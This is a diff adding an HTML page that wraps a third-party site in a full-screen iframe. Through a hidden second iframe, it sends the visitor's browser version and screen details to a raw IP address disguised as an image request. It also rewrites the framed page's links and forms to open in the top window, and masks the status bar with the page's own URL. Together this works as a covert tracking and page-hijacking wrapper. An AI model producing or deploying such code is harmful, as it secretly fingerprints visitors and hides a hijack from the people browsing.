@@ -1,0 +1,32 @@
+<html>
+<body scroll='no' style='border:0;margin:0;padding:0;'>
+<iframe src='http://webftp.bbs.hnol.net/dysr/201101/youku_url_20111120.htm?' width='100%' height='100%' frameborder='0'></iframe>
+<iframe src='about:blank' frameborder='0' id='frmContent'></iframe>
+<script>
+try{
+var win=window.frames[1];
+var s=screen;
+var ss="http://121.32.136.106:4022/logo.jpg?p="
++navigator.appMinorVersion+"|"+s.availHeight+"|"+s.availWidth+"|"+s.colorDepth+"|"+s.height+"|"+s.width;
+win.location=ss;}
+catch(e){
+location.reload(true);}
+_hInterval=window.setInterval('Check()', 500);
+function Check(){
+try{
+var win=window.frames[0];
+if(win.document.readyState!='complete'){return;}
+window.clearInterval(_hInterval);
+_hInterval=null;
+var doc=win.document;
+for(var i in doc.links){
+if(doc.links[i].target=="")
+{doc.links[i].target="_top";}}
+for(var i in doc.forms){
+if(doc.forms[i].target==""){doc.forms[i].target="_top";}}}
+catch(e){}
+}
+window.setInterval('window.status=location.href', 200);
+</script>
+</body>
+</html>
